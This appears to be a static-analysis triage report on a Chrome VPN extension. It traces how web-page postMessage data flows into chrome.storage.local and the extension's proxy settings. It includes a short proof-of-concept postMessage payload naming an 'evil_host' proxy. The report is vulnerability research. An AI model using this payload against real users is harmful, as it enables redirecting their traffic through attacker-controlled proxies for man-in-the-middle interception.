# CoCo Analysis: jdgilggpfmjpbodmhndmhojklgfdlhob

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 8 (chrome_storage_local_set_sink - multiple instances of same vulnerability)

---

## Sink: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jdgilggpfmjpbodmhndmhojklgfdlhob/opgen_generated_files/cs_0.js
Line 505: window.addEventListener("message", function(event) {
Line 506: console.log(event.data);
Line 522: chrome.runtime.sendMessage({action: "connect",server:event.data.text}, function(response) {

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jdgilggpfmjpbodmhndmhojklgfdlhob/opgen_generated_files/bg.js
Line 1042: var vars = request.server.split(",");
Line 1045: doConnection(vars[2],vars[0],parseInt(vars[1]),false);

**Code:**

```javascript
// Content script - contentscript.js (line 505-535)
window.addEventListener("message", function(event) {
  console.log(event.data);

  if (event.data.type && (event.data.type == "FROM_PAGE")) {
    var data = { type: "FROM_EXTENSION", text: "connecting" };
    window.postMessage(data, "*");
    chrome.runtime.sendMessage({
      action: "connect",
      server: event.data.text  // <- attacker-controlled from postMessage
    }, function(response) {});
  }

  if (event.data.type && (event.data.type == "FROM_PAGE_GLOBAL")) {
    var data = { type: "FROM_EXTENSION_GLOBAL", text: "connecting" };
    window.postMessage(data, "*");
    chrome.runtime.sendMessage({
      action: "connectGlobal",
      server: event.data.text  // <- attacker-controlled from postMessage
    }, function(response) {});
  }
});

// Background script - service.js (line 1035-1076)
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
  if (sender.id == "lochiccbgeohimldjooaakjllnafhaid" ||
      sender.id == "jcbiifklmgnkppebelchllpdbnibihel" ||
      sender.id == "jdgilggpfmjpbodmhndmhojklgfdlhob") {

    if (request.action == "connect") {
      sendResponse('received');
      if (request.server == "Direct Connection") { disconnect(); }
      else { connect(request.server, request.failSafe); }  // <- attacker-controlled server param
    }

    if (request.action == "connectGlobal") {
      var vars = request.server.split(",");  // <- attacker-controlled
      // vars[0], vars[1], vars[2] are all attacker-controlled
      doConnection(vars[2], vars[0], parseInt(vars[1]), false);
      // These values are stored in chrome.storage.local inside doConnection()
    }
  }
});

// Content script also has storage write (line 542)
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
  chrome.storage.local.set({"server": request.server});  // <- Storage poisoning
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (webpage can send messages to content script)

**Attack:**

```javascript
// From any webpage where the content script runs (all URLs per manifest)
window.postMessage({
  type: "FROM_PAGE",
  text: "malicious_server_config"
}, "*");

// Or for the connectGlobal action:
window.postMessage({
  type: "FROM_PAGE_GLOBAL",
  text: "evil_host,9999,evil_protocol"  // Comma-separated values parsed by split()
}, "*");
```

**Impact:** Complete storage exploitation chain with attacker-controlled VPN server configuration. The attacker can:
1. Send arbitrary server configuration data via window.postMessage
2. Content script forwards this to background script via chrome.runtime.sendMessage
3. Background script stores attacker-controlled server values in chrome.storage.local
4. The malicious server configuration is then used to establish proxy connections (doConnection function)
5. This allows the attacker to redirect all user traffic through attacker-controlled proxy servers

The vulnerability allows full control over the VPN proxy configuration, enabling man-in-the-middle attacks on all user traffic.
